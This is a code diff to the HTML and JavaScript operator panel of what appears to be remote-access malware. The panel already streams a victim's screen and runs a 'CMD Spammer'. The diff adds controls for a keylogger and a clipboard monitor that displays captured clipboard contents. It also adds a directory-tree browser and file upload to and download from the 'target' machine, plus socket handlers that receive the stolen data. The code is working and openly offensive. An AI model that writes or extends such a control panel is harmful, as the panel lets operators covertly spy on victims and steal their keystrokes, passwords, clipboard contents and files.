@@ -44,6 +44,10 @@
       <button onclick="toggleOptions('cmd_spammer')">CMD Spammer</button>
       <button onclick="toggleStream('start')">Start Stream</button>
       <button onclick="toggleStream('stop')">Stop Stream</button>
+      <button onclick="toggleOptions('keylogger')">Keylogger</button>
+      <button onclick="toggleOptions('clipboard')">Clipboard Monitor</button>
+      <button onclick="toggleOptions('file_transfer')">File Transfer</button>
+      <button onclick="toggleOptions('dir_tree')">Directory Tree</button>
     </div>
 
     <!-- Command Forms -->
@@ -61,6 +65,29 @@
       <button onclick="sendCommand(null, 'cmd_spammer_on')">Start CMD Spammer</button>
       <button onclick="sendCommand(null, 'cmd_spammer_off')">Stop CMD Spammer</button>
     </div>    
+
+    <div id="keylogger" class="options">
+      <h2>Keylogger Controls</h2>
+      <div class="keylogger-controls">
+        <button onclick="sendCommand(null, 'start_keylogger')">Start Keylogger</button>
+        <button onclick="sendCommand(null, 'stop_keylogger')">Stop Keylogger</button>
+      </div>
+      <div class="keylogger-status">
+        <p>Status: <span id="keylogger_status">Inactive</span></p>
+      </div>
+    </div>
+    
+    <div id="clipboard" class="options">
+      <h2>Clipboard Monitoring</h2>
+      <div class="clipboard-controls">
+        <button onclick="sendCommand(null, 'start_clipboard')">Start Monitoring</button>
+        <button onclick="sendCommand(null, 'stop_clipboard')">Stop Monitoring</button>
+      </div>
+      <div class="clipboard-history">
+        <h3>Recent Clipboard Contents</h3>
+        <div id="clipboard_contents" class="clipboard-list"></div>
+      </div>
+    </div>
 
     <div id="ip_info" class="options">
       <h2>Get IP Info</h2>
@@ -176,6 +203,31 @@
     </div>
     <!-- --------------------------------- -->
 
+    <div id="dir_tree" class="options">
+      <h2>Directory Tree</h2>
+      <form onsubmit="sendCommand(event, 'dir_tree')">
+        <label for="tree_path">Start Path:</label>
+        <input type="text" id="tree_path" name="data" placeholder="C:\">
+        <button type="submit">Generate Tree</button>
+      </form>
+    </div>
+
+    <div id="file_transfer" class="options">
+      <h2>File Transfer</h2>
+      <div class="transfer-section">
+        <!-- Upload Section -->
+        <h3>Upload to Target</h3>
+        <input type="file" id="file_upload">
+        <input type="text" id="upload_path" placeholder="Destination path (e.g. C:\file.txt)">
+        <button onclick="uploadFile()">Upload File</button>
+      </div>
+        <!-- Download Section -->
+      <div class="transfer-section">
+        <h3>Download from Target</h3>
+        <input type="text" id="download_path" placeholder="File to download (e.g. C:\file.txt)">
+        <button onclick="downloadFile()">Download File</button>
+      </div>
+    </div>
     <!-- Execution Status -->
     <div class="status" id="status">
       <h3>Execution Status</h3>
@@ -200,64 +252,104 @@
   </div> -->
 
 
-<!-- Add Socket.IO client -->
-<script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
-<script>
-  // Initialize WebSocket connection
-  const socket = io();
-  const liveScreenshot = document.getElementById('live_screenshot');
-
-  // Handle screen updates
-  socket.on('update_image', (data) => {
-    liveScreenshot.src = 'data:image/jpeg;base64,' + data;
-  });
-
-  // NEW STREAM CONTROL FUNCTION
-  function toggleStream(action) {
-    const streamContainer = document.getElementById('streamContainer');
-    const deviceId = document.getElementById('device_select').value;
-    
-    if (!deviceId) {
-        alert('Please select a device first');
-        return;
-    }
-    
-    if (action === 'start') {
-        streamContainer.style.display = 'block';
-        sendCommand(null, 'start_stream');
-    } else {
-        streamContainer.style.display = 'none';
-        sendCommand(null, 'stop_stream');
-    }
-}
-
-  // Toggle show/hide for each command form
-  function toggleOptions(id) {
-    const section = document.getElementById(id);
-    
-    // Close all other sections
-    document.querySelectorAll('.options.active').forEach(opt => {
-      if (opt !== section) {
-        opt.classList.remove('active');
+  <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+  <script>
+    // Initialize WebSocket connection
+    const socket = io();
+    const liveScreenshot = document.getElementById('live_screenshot');
+  
+    // Handle screen updates
+    socket.on('update_image', (data) => {
+      liveScreenshot.src = 'data:image/jpeg;base64,' + data;
+    });
+  
+    socket.on('keylogger_update', (data) => {
+      document.getElementById('keylogger_status').textContent = data.status;
+    });
+  
+    socket.on('clipboard_update', (content) => {
+      const clipboardDiv = document.getElementById('clipboard_contents');
+      const entry = document.createElement('div');
+      entry.className = 'clipboard-entry';
+      entry.textContent = content;
+      clipboardDiv.prepend(entry);
+    });
+  
+    // NEW FILE TRANSFER HANDLER
+    socket.on('file_response', (data) => {
+      if (data.filename && data.content) {
+        const blob = new Blob([atob(data.content)], {type: 'application/octet-stream'});
+        const link = document.createElement('a');
+        link.href = window.URL.createObjectURL(blob);
+        link.download = data.filename;
+        link.click();
       }
     });
-    
-    // Toggle the current one
-    section.classList.toggle('active');
-    
-    // If using smooth scroll, optionally scroll the selected section into view
-    if (section.classList.contains('active')) {
-      section.scrollIntoView({ behavior: 'smooth', block: 'start' });
+  
+    // Stream control function
+    function toggleStream(action) {
+      const streamContainer = document.getElementById('streamContainer');
+      const deviceId = document.getElementById('device_select').value;
+      
+      if (!deviceId) {
+          alert('Please select a device first');
+          return;
+      }
+      
+      if (action === 'start') {
+          streamContainer.style.display = 'block';
+          sendCommand(null, 'start_stream');
+      } else {
+          streamContainer.style.display = 'none';
+          sendCommand(null, 'stop_stream');
+      }
     }
-  }
-
+  
+    // Toggle command sections
+    function toggleOptions(id) {
+      const section = document.getElementById(id);
+      document.querySelectorAll('.options.active').forEach(opt => {
+        if (opt !== section) opt.classList.remove('active');
+      });
+      section.classList.toggle('active');
+      if (section.classList.contains('active')) {
+        section.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      }
+    }
+  
+    // File transfer functions
+    function uploadFile() {
+      const fileInput = document.getElementById('file_upload');
+      const pathInput = document.getElementById('upload_path');
+      
+      if (!fileInput.files[0] || !pathInput.value) {
+          alert('Please select a file and destination path');
+          return;
+      }
+  
+      const reader = new FileReader();
+      reader.onload = function(e) {
+          const base64Data = btoa(String.fromCharCode(...new Uint8Array(e.target.result)));
+          sendCommand(null, 'put_file', `${pathInput.value}|${base64Data}`);
+      };
+      reader.readAsArrayBuffer(fileInput.files[0]);
+    }
+  
+    function downloadFile() {
+      const path = document.getElementById('download_path').value;
+      if (!path) {
+          alert('Please enter a file path');
+          return;
+      }
+      sendCommand(null, 'download_file', path);
+    }
+  
     async function fetchDevices() {
       try {
         const response = await fetch('/devices');
         const data = await response.json();
         const deviceSelect = document.getElementById('device_select');
         deviceSelect.innerHTML = '';
-
         for (const [id, info] of Object.entries(data.devices)) {
           const option = document.createElement('option');
           option.value = id;
@@ -268,90 +360,80 @@
         console.error('Error fetching devices:', error);
       }
     }
-
+  
     async function sendCommand(event, command) {
-    if (event) event.preventDefault(); // Prevent form submission (only for forms)
-
-    const deviceId = document.getElementById('device_select').value;
-    if (!deviceId) {
-        alert('❌ Please select a device.');
-        return;
-    }
-
-    let data = "";
-    
-    // If the event is from a form, extract form data
-    if (event && event.target && event.target.tagName === "FORM") {
-        const formData = new FormData(event.target);
-        data = formData.get('data') || "";
-    }
-
-    console.log(`📡 Sending command: ${command} to device: ${deviceId} with data: ${data}`); // Debugging
-
-    try {
-        const response = await fetch('/send_command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ device_id: deviceId, command, data })
-        });
-
-        console.log("Response status:", response.status); // Debugging
-        if (response.ok) {
-            document.getElementById('status_message').innerText = 
-              `✅ Command '${command}' sent successfully.`;
-        } else {
-            document.getElementById('status_message').innerText = 
-              `❌ Failed to send command '${command}'.`;
-        }
-
-    } catch (error) {
-        console.error("❌ Error sending command:", error);
-        document.getElementById('status_message').innerText = 
-          `❌ Error sending command '${command}': ${error}`;
-    }
-}
-
-
-    // Periodically fetch status and response
-    async function fetchStatusAndResponse() {
+      if (event) event.preventDefault();
+      const deviceId = document.getElementById('device_select').value;
+      if (!deviceId) {
+          alert('❌ Please select a device.');
+          return;
+      }
+  
+      let data = "";
+      if (event?.target?.tagName === "FORM") {
+          data = new FormData(event.target).get('data') || "";
+      }
+  
+      // Visual feedback
+      if (command.includes('keylogger')) {
+          document.getElementById('keylogger_status').textContent = 
+              command.includes('start') ? 'Activating...' : 'Deactivating...';
+      }
+      if (command.includes('clipboard')) {
+          const clipboardDiv = document.getElementById('clipboard_contents');
+          clipboardDiv.innerHTML = command.includes('start') 
+              ? '<div class="clipboard-entry">Monitoring started...</div>'
+              : '<div class="clipboard-entry">Monitoring stopped</div>';
+      }
+  
       try {
-        const deviceId = document.getElementById('device_select').value;
-        if (!deviceId) return;
-
-        const statusResponse = await fetch('/status');
-        const status = await statusResponse.json();
-        document.getElementById('status_message').innerText = 
-          JSON.stringify(status.status, null, 2);
-
-        const responseResponse = await fetch('/response/' + deviceId);
-        const response = await responseResponse.json();
-        document.getElementById('response_message').innerText = 
-          response.message || '';
-
-        const imgElement = document.getElementById('response_image');
-        if (response.image_path) {
-          imgElement.src = response.image_path;
-          imgElement.style.display = 'block';
-        } else {
-          imgElement.style.display = 'none';
-        }
-
-        const fileDownloadElement = document.getElementById('file_download');
-        const fileLinkElement = document.getElementById('file_link');
-        if (response.file_path) {
-          fileLinkElement.href = response.file_path;
-          fileDownloadElement.style.display = 'block';
-        } else {
-          fileDownloadElement.style.display = 'none';
-        }
+          const response = await fetch('/send_command', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ device_id: deviceId, command, data })
+          });
+  
+          document.getElementById('status_message').innerText = 
+              response.ok ? `✅ Command '${command}' sent` : `❌ Failed to send '${command}'`;
+  
       } catch (error) {
-        console.error('Error fetching status or response:', error);
+          console.error("❌ Error sending command:", error);
+          document.getElementById('status_message').innerText = 
+              `❌ Error sending '${command}': ${error}`;
       }
     }
-
-    // Initialize
+  
+    // Initialize and periodic updates
     fetchDevices();
-    setInterval(fetchStatusAndResponse, 2000);
+    setInterval(async () => {
+      const deviceId = document.getElementById('device_select').value;
+      if (!deviceId) return;
+      
+      try {
+        const [statusRes, responseRes] = await Promise.all([
+          fetch('/status'),
+          fetch(`/response/${deviceId}`)
+        ]);
+        
+        const status = await statusRes.json();
+        const response = await responseRes.json();
+        
+        document.getElementById('status_message').innerText = JSON.stringify(status.status, null, 2);
+        document.getElementById('response_message').innerText = response.message || '';
+        
+        const imgElement = document.getElementById('response_image');
+        imgElement.style.display = response.image_path ? 'block' : 'none';
+        if (response.image_path) imgElement.src = response.image_path;
+  
+        const fileDownload = document.getElementById('file_download');
+        const fileLink = document.getElementById('file_link');
+        fileDownload.style.display = response.file_path ? 'block' : 'none';
+        if (response.file_path) fileLink.href = response.file_path;
+        
+      } catch (error) {
+        console.error('Error fetching status:', error);
+      }
+    }, 2000);
   </script>
 </body>
 </html>
